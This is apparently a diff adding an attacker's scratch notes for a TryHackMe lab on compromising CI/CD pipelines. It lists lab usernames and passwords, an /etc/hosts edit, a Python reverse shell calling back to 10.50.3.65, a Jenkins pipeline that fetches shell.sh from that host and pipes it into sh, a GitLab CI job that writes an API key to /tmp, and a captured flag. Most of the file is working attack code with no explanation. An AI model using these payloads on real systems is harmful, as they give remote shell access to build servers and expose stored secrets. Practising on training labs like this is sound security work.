@@ -1,0 +1,61 @@
+Username: brecher1
+Password: fTphTejZpa-8eEYh
+MailAddr: brecher1@tryhackme.loc
+IP Range: 10.200.3.0/24
+=======================================
+Username  anatacker
+Password  Password1@
+=======================================
+=======================================
+gitlab.tryhackme.com
+
+ajay 
+ajay@local.com 
+Hello1234@
+=======================================
+
+sudo echo 10.200.3.150  gitlab.tryhackme.loc >> /etc/hosts && sudo echo 10.200.3.160  jenkins.tryhackme.loc >> /etc/hosts
+
+=======================================
+simple reverse shell shell.sh
+
+/usr/bin/python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.50.3.65",1225)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+
+
+=======================================
+
+
+pipeline {
+    agent any
+    stages {
+       stage('build') {
+          steps {
+              sh '''
+                    curl http://10.50.3.65:8000/shell.sh | sh
+                '''                 
+              }             
+          }
+       }       
+    }
+
+
+    stages:
+  - test
+  - deploy
+
+test:
+  stage: test
+  script:
+    - 'echo "Testing Application: ${CI_PROJECT_NAME}"'
+
+production:
+  stage: deploy
+  when: manual
+  script:
+    - 'echo "Deploying to ${CI_ENVIRONMENT_NAME}"'
+    - 'echo "${API_KEY}" > /tmp/key'
+    - 'echo "Ready to use the API KEY"'
+  environment:
+    name: ${CI_JOB_NAME}
+
+THM{Secrets.are.meant.to.be.kept.Secret}
